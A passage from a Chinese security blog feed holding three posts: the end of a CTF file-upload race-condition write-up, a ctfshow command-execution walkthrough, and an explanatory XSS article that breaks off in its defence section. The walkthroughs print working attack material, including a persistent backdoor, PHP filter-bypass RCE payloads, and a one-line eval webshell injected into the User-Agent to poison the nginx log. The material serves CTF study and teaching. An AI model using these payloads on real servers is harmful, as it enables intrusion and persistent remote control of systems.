即可控制服务器。</li></ol><hr><p><strong>shell.php执行后新建my.php文件并写入一句话木马，作用是当上传的shell.php被删后，后端还存有my.php中的后门，方便连接。</strong></p><p>接下来抓取上传shell.php的请求包，发送到<strong>Intruder</strong>爆破模块</p><p><img src="/images/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.png"></p><p>除此之外最好设置多线程重放，增加条件竞争成功的可能性。</p><p>不断访问上传的<code>shell.php</code>文件，一旦有<code>200</code>状态码，说明条件竞争成功。监控脚本启动后，开始进行无限重放</p><h2 id="验证攻击"><a href="#验证攻击" class="headerlink" title="验证攻击"></a>验证攻击</h2><p>访问 <code>http://ctf.com/uploads/my.php</code>，用HackBar发送POST请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/uploads/my.php</span> <span class="hljs-meta">HTTP/1.1</span><br>...<br>my=system(&quot;ls -al /&quot;);<br></code></pre></td></tr></table></figure><p>若返回服务器目录列表，则攻击成功。</p><hr><h3 id="防御方案（CTF出题方向）"><a href="#防御方案（CTF出题方向）" class="headerlink" title="防御方案（CTF出题方向）"></a>防御方案（CTF出题方向）</h3><ol><li><p><strong>禁用临时文件执行</strong>  </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> <span class="hljs-regexp">~ /tmp/</span> &#123;<br>   <span class="hljs-attribute">deny</span> all; <span class="hljs-comment"># 禁止访问/tmp目录</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>原子性移动操作</strong><br>使用 <code>rename()</code> 而非分步操作（Linux下移动是原子的）。</p></li><li><p><strong>内容二次渲染</strong><br>对图片进行压缩&#x2F;缩放，破坏嵌入的PHP代码。</p></li><li><p><strong>临时目录隔离</strong><br>将临时文件生成到不可访问的私有目录（如 <code>/var/upload_tmp/</code>）。</p></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2025/06/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/06/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="命令执行常见函数："><a href="#命令执行常见函数：" class="headerlink" title="命令执行常见函数："></a>命令执行常见函数：</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span>    <span class="hljs-comment">// 执行外部程序并显示输出</span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span>      <span class="hljs-comment">// 执行外部程序</span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span>  <span class="hljs-comment">// 执行外部程序并显示原始输出</span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span> <span class="hljs-comment">// 通过shell执行命令</span><br>`` ``<br>(反引号)    <span class="hljs-comment">// 执行shell命令</span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span>     <span class="hljs-comment">// 打开进程文件指针</span><br><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">()</span></span> <span class="hljs-comment">// 执行命令并打开文件指针</span><br></code></pre></td></tr></table></figure><h2 id="常用连接符："><a href="#常用连接符：" class="headerlink" title="常用连接符："></a>常用连接符：</h2><pre><code class="hljs">; 顺序执行多条命令(Unix)&amp; 后台执行&amp;&amp; 前一条成功才执行后一条| 管道符|| 前一条失败才执行后一条\n(换行符) 也可作为命令分隔符</code></pre><h3 id="管道符："><a href="#管道符：" class="headerlink" title="管道符："></a>管道符：</h3><p>在命令注入攻击中，管道符可以：</p><p><strong>串联多个命令</strong>：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://example.<span class="hljs-keyword">com</span>/vuln.php?<span class="hljs-built_in">input</span>=<span class="hljs-keyword">file</span>.txt|whoami<br></code></pre></td></tr></table></figure><p>尝试执行<code>file.txt</code>后接着执行<code>whoami</code></p><p><strong>过滤或处理输出</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://example.com/vuln.php?input=<span class="hljs-built_in">ls</span>|<span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure><p>将<code>ls</code>命令的输出进行base64编码</p><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br><br></code></pre></td></tr></table></figure><p> 检查 HTTP 请求中是否包含名为 c 的参数。如果存在，执行后续代码；否则，跳到 else 语句。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$c = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>]<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><p>获取 HTTP 请求中的 c 参数并将其赋值给变量 $c。 （此处的$c不一定是c，只是更好理解罢了）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>)</span></span>)&#123; <br></code></pre></td></tr></table></figure><p>使用 preg_match() 函数对 $c 变量进行正则匹配。这个正则表达式检查 $c 中是否包含不区分大小写的字符串 “flag”。如果 $c 中不包含 “flag”，则继续执行后续代码。</p><p>eval($c); 使用 eval() 函数执行 $c 变量中的代码。eval() 会将 $c 中的字符串作为 PHP 代码执行，这可能导致执行任意 PHP 代码，从而形成安全漏洞。</p><p>eval($_GET[2])：</p><ul><li><code>eval()</code> 执行字符串作为 PHP 代码。</li><li><code>$_GET[2]</code> 从 URL 参数 <code>2</code> 获取值（如 <code>&amp;2=system(...)</code>）。</li><li>这允许 <strong>动态执行任意命令</strong>，无需修改 User-Agent 反复注入。</li></ul><p>} 结束 if(!preg_match(“&#x2F;flag&#x2F;i”, $c)) 语句的判断。</p><p>}else{ 如果 $_GET[‘c’] 不存在（即 c 参数没有传递），则执行以下代码。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">highlight_file</span>(FILE); <br></code></pre></td></tr></table></figure><p>highlight_file() 函数将当前 PHP 文件的源代码高亮显示。FILE 是一个常量，它表示当前脚本的文件路径。这意味着如果没有 c 参数，脚本将显示自身的源代码。</p><p>} 结束else语句块</p><p>尝试url&#x2F;?c&#x3D;system(‘ls’);（<strong>闭合标签<code>?&gt;</code></strong>：当PHP遇到<code>?&gt;</code>时，会<strong>自动在结尾插入分号</strong>（称为”隐含分号”），因此<code>system(&#39;ls&#39;)?&gt;</code>等价于<code>system(&#39;ls&#39;);</code>）</p><p>当程序执行到 system(‘ls’) 时，会调用系统的 Shell（如 Bash），运行 ls 命令，列出当前目录下的文件和文件夹（相当于在终端直接输入 ls）。</p><p>得到</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">flag.php <span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure><h4 id="cat：正序，查看-合并文件"><a href="#cat：正序，查看-合并文件" class="headerlink" title="cat：正序，查看&#x2F;合并文件"></a>cat：正序，查看&#x2F;合并文件</h4><h4 id="tac：倒序，查看日志时，优先显示最新行"><a href="#tac：倒序，查看日志时，优先显示最新行" class="headerlink" title="tac：倒序，查看日志时，优先显示最新行"></a>tac：倒序，查看日志时，优先显示最新行</h4><p>本题flag被ban，用通配符*，访问?c&#x3D;system(‘tac fla*.php’);得到flag，访问?c&#x3D;system(‘cat fla*.php’);无显示，查看源代码得到flag</p><p><strong>tac</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">flag = <span class="hljs-string">&#x27;ctfshow&#123;7b9e92b8-e4c5-4478-a9eb-e4a8862691a5&#125;&#x27;</span>;</span><br><br>*/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@<span class="hljs-built_in">link</span>: https://ctfer.com</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@email: h1xa@ctfer.com</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Last Modified <span class="hljs-keyword">time</span>: 2020-09-04 00:14:17</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Last Modified by:   h1xa</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Date:   2020-09-04 00:14:07</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Author: h1xa</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-*- coding: utf-8 -*-</span><br>/*<br><br>&lt;?php<br></code></pre></td></tr></table></figure><p>输出顺序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;/html&gt;       <span class="hljs-comment">// 浏览器认为文档已结束</span><br>...<br>&lt;html&gt;        <span class="hljs-comment">// 被当作普通文本</span><br><span class="hljs-meta">&lt;?php</span> ... <span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">// 全部当作文本显示</span><br></code></pre></td></tr></table></figure><p>→ Flag直接可见</p><p><strong>cat</strong>（源代码）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:14:07</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 00:14:17</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;ctfshow&#123;c78ff3fc-09d6-4aa0-9b59-689b0eefebd3&#125;&#x27;</span>;<br><br></code></pre></td></tr></table></figure><p>输出顺序：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span> ... <span class="hljs-meta">?&gt;</span></span><span class="language-xml">  // PHP引擎执行，可能抑制输出</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>        // 浏览器开始解析</span><br><span class="language-xml">...</span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- flag --&gt;</span> // 可能被隐藏</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p><em>!preg_match(“&#x2F;flag|system|php&#x2F;i”, $c</em></p><p>用<strong>passthru</strong>代替<strong>system</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&#x27;tac fla*.ph*&#x27;</span>);<br></code></pre></td></tr></table></figure><p>通配符：?匹配单个字符，*匹配任何数量字符，可以是0</p><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><p><a href="https://blog.csdn.net/weixin_51213906/article/details/123010661">PHP-RCE绕过的姿势总结_rce如何绕过对system的过滤-CSDN博客</a></p><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p><em>if(!preg_match(“&#x2F;flag|system|php|cat|sort|shell|.| |&#39;|`|echo|;|(&#x2F;i”, $c)){</em> </p><p>先尝试用?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;system(‘ls’);</p><ul><li>原始代码：<code>include$_GET[1]?&gt;</code><ul><li><code>?&gt;</code> 是PHP的闭合标签，表示PHP代码结束。后续内容（<code>&amp;1=data://...</code>）会被视为普通文本（非PHP代码）。</li></ul></li><li>若替换为<code>include$_GET[1];</code>：<ul><li>分号<code>;</code>表示语句结束，但<strong>缺少空格</strong>导致语法错误。PHP会将<code>include$_GET[1]</code>视为一个未定义的常量（而非<code>include</code>关键字），从而报错。</li></ul></li></ul><p>payload：url&#x2F;?c&#x3D;include $_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls'); ?></p><p>区别在于<code>1</code>参数的值：</p><ul><li>失败案例：纯字符串 <code>system(&#39;ls&#39;);</code></li><li>成功案例：<code>data://</code>协议封装的数据流</li></ul><h4 id="include语句的工作机制"><a href="#include语句的工作机制" class="headerlink" title="include语句的工作机制"></a><strong><code>include</code>语句的工作机制</strong></h4><p>当执行 <code>include $_GET[1]</code> 时：</p><ol><li>PHP会尝试将 <code>$_GET[1]</code> 的值作为<strong>文件路径</strong>处理</li><li>读取该路径的内容</li><li>将内容当作PHP代码执行</li></ol><h4 id="失败案例解析"><a href="#失败案例解析" class="headerlink" title="失败案例解析"></a><strong>失败案例解析</strong></h4><p>payload1实际执行：<code>include &quot;system(&#39;ls&#39;);&quot;</code></p><p>PHP行为：</p><ol><li>尝试打开名为 <code>system(&#39;ls&#39;);</code> 的文件</li><li>文件系统不存在此文件 → 触发警告</li><li>最终执行的是文件内容（空），而非代码</li></ol><p>payload2实际执行：<code>include &quot;data://text/plain,&lt;?php system(&#39;ls&#39;); ?&gt;&quot;</code></p><p>PHP行为：</p><ol><li>识别<code>data://</code>协议处理器</li><li>解码数据流：<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code></li><li><strong>执行其中的PHP代码</strong> → 运行<code>system(&#39;ls&#39;)</code></li></ol><p>绕过后的payload:url&#x2F;?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,<?php system('ls'); ?></p><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><p>同web32，重点再写一遍<strong>一句话木马</strong>，并尝试用蚁剑连接。</p><p><img src="/images/web33.png"></p><ol><li><p>url加上&#x2F;index.php(嫌麻烦可以跳过)</p></li><li><p>post传参a&#x3D;1(a不要与题目中参数一样)</p></li><li><p>抓包</p></li><li><p>UA头加上**<?php @eval($_POST['shell']); ?>**</p></li><li><p>index.php改为实际路径，如&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure></li><li><p>也可以用<strong>c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong>来绕过waf。</p></li><li><p>post参数改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">shell=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ol><p>发包发现已经得到想要的结果。</p><p><img src="/images/%E8%9A%81%E5%89%911.png"></p><p><img src="/images/%E8%9A%81%E5%89%912.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/2025/06/08/xss/"/>
    <url>/2025/06/08/xss/</url>
    
    <content type="html"><![CDATA[<p>好的，我们来非常详细地讲解一下 <strong>XSS（跨站脚本攻击）</strong>，从基础概念到深入理解，涵盖原理、类型、危害、防御以及实践案例。</p><h2 id="一、什么是-XSS（跨站脚本攻击）？"><a href="#一、什么是-XSS（跨站脚本攻击）？" class="headerlink" title="一、什么是 XSS（跨站脚本攻击）？"></a>一、什么是 XSS（跨站脚本攻击）？</h2><ul><li><strong>核心定义：</strong> XSS 是一种安全漏洞，攻击者能够将<strong>恶意脚本</strong>注入到其他用户会访问和信任的<strong>合法网页</strong>中。</li><li><strong>关键点：</strong><ul><li><strong>“跨站”：</strong> 恶意脚本通常来源于攻击者控制的站点或资源（虽然最终是在受害者访问的目标站点上执行）。</li><li><strong>“脚本”：</strong> 主要是 JavaScript，但也可以是其他浏览器支持的脚本语言（如 VBScript，但已较少见）。JavaScript 因其强大功能和普遍支持成为首选。</li><li><strong>“攻击”：</strong> 目的是窃取用户数据、劫持会话、篡改页面内容、进行钓鱼诈骗、传播恶意软件或发动更高级的攻击。</li></ul></li><li><strong>本质：</strong> XSS 利用了 Web 应用对<strong>用户输入数据的不充分验证和转义</strong>。当 Web 应用将用户提供的数据直接嵌入到其输出的 HTML 页面中，而没有进行适当的清理时，攻击者就能插入可被浏览器执行的恶意代码。</li><li><strong>受害者视角：</strong> 用户访问了一个看似正常、可信的网站（如银行、社交媒体、论坛），却不知该网站已被注入了恶意脚本。用户的浏览器在渲染页面时，会忠实地执行这些脚本，导致攻击发生。用户通常对此毫无察觉。</li></ul><h2 id="二、XSS-攻击是如何发生的？-原理剖析"><a href="#二、XSS-攻击是如何发生的？-原理剖析" class="headerlink" title="二、XSS 攻击是如何发生的？(原理剖析)"></a>二、XSS 攻击是如何发生的？(原理剖析)</h2><p>想象一下 Web 应用处理用户输入并显示结果的典型流程：</p><ol><li><strong>用户输入：</strong> 用户在 Web 表单、搜索框、URL 参数、评论框等地方输入数据（如 <code>张三</code>）。</li><li><strong>服务器处理：</strong> Web 服务器接收输入数据，并可能将其存储在数据库（如评论）或直接用于生成新页面（如搜索结果）。</li><li><strong>页面生成：</strong> 服务器将处理结果（包含用户输入的数据）嵌入到动态生成的 HTML 页面中。例如：<ul><li>评论页面： <code>&lt;div&gt;用户说：张三&lt;/div&gt;</code></li><li>搜索结果页面： <code>&lt;p&gt;您搜索的关键词是：张三&lt;/p&gt;</code></li></ul></li><li><strong>浏览器渲染：</strong> 用户的浏览器接收到 HTML 页面，解析并渲染它。浏览器遇到 <code>&lt;script&gt;</code> 标签或具有 JavaScript 代码的事件属性（如 <code>onerror</code>, <code>onload</code>, <code>onclick</code>）时，会<strong>执行其中的代码</strong>。</li></ol><h3 id="漏洞点在哪里？"><a href="#漏洞点在哪里？" class="headerlink" title="漏洞点在哪里？"></a>漏洞点在哪里？</h3><p>问题出在第 3 步：<strong>将未经验证&#x2F;转义的用户输入直接嵌入到 HTML 输出中</strong>。</p><ul><li><strong>正常情况：</strong> 用户输入的是无害文本（如 <code>张三</code>）。</li><li><strong>攻击情况：</strong> 攻击者输入的是<strong>精心构造的字符串</strong>，这些字符串包含 HTML 和 JavaScript 代码。如果服务器端没有对这些输入进行过滤或转义，这些代码就会原封不动地成为最终 HTML 页面的一部分。</li></ul><h3 id="攻击者输入示例"><a href="#攻击者输入示例" class="headerlink" title="攻击者输入示例"></a>攻击者输入示例</h3><p>假设有一个搜索功能，搜索词会显示在结果页面上：</p><ul><li>攻击者不输入 <code>猫</code>，而是输入：<br><code>&lt;script&gt;alert(&#39;XSS!&#39;);&lt;/script&gt;</code></li><li>如果服务器未处理，生成的页面可能包含：<br><code>&lt;p&gt;您搜索的关键词是：&lt;script&gt;alert(&#39;XSS!&#39;);&lt;/script&gt;&lt;/p&gt;</code></li><li>当其他用户访问这个搜索结果页面时，浏览器会解析到 <code>&lt;script&gt;</code> 标签，并执行 <code>alert(&#39;XSS!&#39;);</code>，弹出一个警告框。这就是一个最简单的 XSS 攻击证明（PoC）。</li></ul><h2 id="三、XSS-攻击的主要类型"><a href="#三、XSS-攻击的主要类型" class="headerlink" title="三、XSS 攻击的主要类型"></a>三、XSS 攻击的主要类型</h2><p>根据恶意脚本的<strong>来源</strong>和<strong>持久性</strong>，XSS 通常分为三类：</p><ol><li><p><strong>反射型 XSS (Reflected XSS &#x2F; Non-Persistent XSS)</strong></p><ul><li><strong>原理：</strong> 恶意脚本作为<strong>请求的一部分</strong>（通常是 URL 参数）发送给服务器，服务器在响应中<strong>原样返回</strong>这个脚本，浏览器执行它。脚本<strong>不会</strong>被存储在服务器上（如数据库中）。</li><li><strong>攻击方式：</strong><ul><li>攻击者构造一个包含恶意脚本的特殊 URL（例如：<code>https://victim-site.com/search?query=&lt;script&gt;恶意代码&lt;/script&gt;</code>）。</li><li>通过<strong>钓鱼邮件、社交媒体、即时消息</strong>等方式诱骗受害者点击这个链接。</li><li>受害者点击链接 → 浏览器向 <code>victim-site.com</code> 发送请求（包含恶意脚本）→ 服务器生成包含恶意脚本的页面 → 受害者的浏览器接收并执行该脚本。</li></ul></li><li><strong>特点：</strong><ul><li><strong>非持久化：</strong> 恶意脚本只存在于这次请求的响应中，不会存储在服务器端。</li><li><strong>需要用户交互：</strong> 通常需要诱骗用户点击恶意链接。</li><li><strong>针对个体：</strong> 一次攻击影响点击该链接的特定用户。</li><li><strong>常见位置：</strong> 搜索框、错误消息页面、表单提交确认页等将输入直接反射回页面的地方。</li></ul></li></ul></li><li><p><strong>存储型 XSS (Stored XSS &#x2F; Persistent XSS)</strong></p><ul><li><strong>原理：</strong> 恶意脚本被提交到服务器（例如通过评论、论坛帖子、用户资料、留言板），并<strong>永久存储</strong>在服务器端（如数据库中）。当其他用户后来访问<strong>包含该存储内容</strong>的页面时，恶意脚本就会从服务器加载并执行。</li><li><strong>攻击方式：</strong><ul><li>攻击者在目标网站的允许用户输入且内容会被展示给其他用户的地方（如评论区）提交包含恶意脚本的内容（如 <code>&lt;script&gt;恶意代码&lt;/script&gt;</code>）。</li><li>服务器未经验证&#x2F;转义将其存入数据库。</li><li>当任何合法用户访问显示该内容的页面（如查看那条评论的页面）时，恶意脚本会从服务器加载，嵌入在页面中，并在用户的浏览器中执行。</li></ul></li><li><strong>特点：</strong><ul><li><strong>持久化：</strong> 恶意脚本长期存储在服务器上，危害持续存在。</li><li><strong>无需直接交互：</strong> 受害者只需访问受感染的页面即可中招，无需点击特定链接。</li><li><strong>影响范围广：</strong> 所有访问该受感染页面的用户都可能成为受害者。</li><li><strong>危害最大：</strong> 最常见也最危险，因为它能自动感染大量用户。</li><li><strong>常见位置：</strong> 用户评论、论坛帖子、聊天消息、用户昵称、商品描述（如果可以用户编辑）等。</li></ul></li></ul></li><li><p><strong>基于 DOM 的 XSS (DOM-based XSS)</strong></p><ul><li><strong>原理：</strong> 整个攻击过程<strong>完全在客户端浏览器中发生</strong>，不涉及服务器响应内容的直接注入。恶意脚本是通过修改页面的 <strong>DOM（文档对象模型）</strong> 环境来触发的。漏洞存在于<strong>客户端 JavaScript 代码</strong>中，该代码不安全地处理用户可控的数据（如 URL 片段 <code>#</code> 后面的部分 <code>location.hash</code>、 <code>document.referrer</code> 或其他 DOM 属性），并用于动态更新 DOM（例如使用 <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code> 等危险方法）。</li><li><strong>攻击方式：</strong><ul><li>攻击者构造一个包含恶意数据的特殊 URL（通常是 <code>#</code> 后面的片段，如 <code>https://victim-site.com/page#恶意数据</code>）。</li><li>诱骗受害者点击该链接。</li><li>受害者浏览器加载正常页面和 JavaScript。</li><li>页面中的<strong>有漏洞的客户端 JavaScript</strong> 读取了 URL 中的恶意数据（如 <code>location.hash</code>）。</li><li>该 JavaScript 代码<strong>不安全地将恶意数据插入到 DOM 中</strong>（例如 <code>element.innerHTML = location.hash.substring(1);</code>）。</li><li>浏览器解析新插入的包含恶意脚本的 HTML，导致脚本执行。</li></ul></li><li><strong>特点：</strong><ul><li><strong>纯客户端：</strong> 恶意代码的执行不依赖于服务器返回的响应内容（虽然触发它的数据可能来自 URL，但服务器可能根本不处理 <code>#</code> 后的片段）。</li><li><strong>难以检测：</strong> 服务器日志可能看不到恶意负载（因为片段 <code>#</code> 后的内容通常不发送到服务器），传统的服务器端 WAF 或扫描器可能无法发现。</li><li><strong>依赖前端代码：</strong> 漏洞根源在于前端 JavaScript 逻辑不安全地操作了用户可控的 DOM 数据源。</li><li><strong>常见来源：</strong> <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>document.cookie</code>, <code>window.name</code>, <code>postMessage</code> 数据等。</li><li><strong>常见接收器（Sink）：</strong> <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write()</code>, <code>document.writeln()</code>, <code>eval()</code>, <code>setTimeout()</code>, <code>setInterval()</code>, <code>Function()</code> 构造函数等能将字符串解析为 HTML 或执行代码的方法&#x2F;属性。</li></ul></li></ul></li></ol><h2 id="四、XSS-攻击能造成什么危害？-攻击载荷-Payload"><a href="#四、XSS-攻击能造成什么危害？-攻击载荷-Payload" class="headerlink" title="四、XSS 攻击能造成什么危害？(攻击载荷 - Payload)"></a>四、XSS 攻击能造成什么危害？(攻击载荷 - Payload)</h2><p>一旦恶意脚本在受害者浏览器中执行，攻击者几乎可以执行该用户在该网站上下文中的任何操作：</p><ol><li><strong>窃取 Cookie：</strong> 最常见的攻击载荷。脚本可以访问当前站点的 Cookie（如果 Cookie 没有设置 <code>HttpOnly</code> 标志）：<code>document.cookie</code>。窃取到的会话 Cookie 可以让攻击者直接<strong>劫持用户会话</strong>，无需密码即可登录用户账户。</li><li><strong>冒充用户操作：</strong> 脚本可以代表用户发起请求（CSRF Token 也可能被窃取或绕过），执行如转账、更改密码、发送消息、购买商品等操作。</li><li><strong>钓鱼攻击：</strong> 脚本可以动态修改页面内容，插入一个伪造的登录表单，诱骗用户输入用户名、密码、信用卡信息等，并发送给攻击者。</li><li><strong>键盘记录：</strong> 脚本可以监听用户在页面上的键盘输入，窃取敏感信息（如密码、信用卡号）。</li><li><strong>窃取敏感信息：</strong> 脚本可以读取 DOM 中的内容，可能包含用户的个人信息、私密消息、财务数据等。</li><li><strong>传播恶意软件：</strong> 脚本可以重定向用户到恶意网站下载病毒、木马、勒索软件，或者利用浏览器漏洞进行攻击。</li><li><strong>网站篡改（Defacement）：</strong> 修改页面内容，显示攻击者的信息或恶作剧内容。</li><li><strong>发起 DDoS 攻击：</strong> 感染大量用户浏览器（僵尸网络）向特定目标发起分布式拒绝服务攻击。</li><li><strong>利用受害者身份进行攻击：</strong> 以受害者为跳板，攻击其所在组织的内部网络（如果受害者是在公司内网访问）。</li><li><strong>记录屏幕&#x2F;摄像头&#x2F;麦克风（需额外权限或漏洞）：</strong> 在特定条件下（如用户授权过或存在漏洞），脚本可能尝试访问用户的摄像头、麦克风或屏幕。</li></ol><h2 id="五、如何防御-XSS-攻击？"><a href="#五、如何防御-XSS-攻击？" class="headerlink" title="五、如何防御 XSS 攻击？"></a>五、如何防御 XSS 攻击？</h2><p>防御 XSS 需要综合应用多种策略，核心原则是：<strong>不要信任任何用户输入！</strong></p><ol><li><p><strong>输入验证 (Input Validation):</strong></p><ul><li><strong>目的：</strong> 